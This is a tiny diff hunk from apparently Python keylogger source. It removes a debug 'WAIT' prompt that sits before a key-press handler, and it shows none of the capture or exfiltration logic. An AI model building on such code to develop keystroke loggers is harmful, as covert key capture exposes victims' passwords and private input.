@@ -332,7 +332,6 @@ class Keylogger:
                 choice = windows_only_platform_menu()
                 continue
         print(choice)
-        input("WAIT")
         if choice == 0:
 
             def on_press(key) -> None:
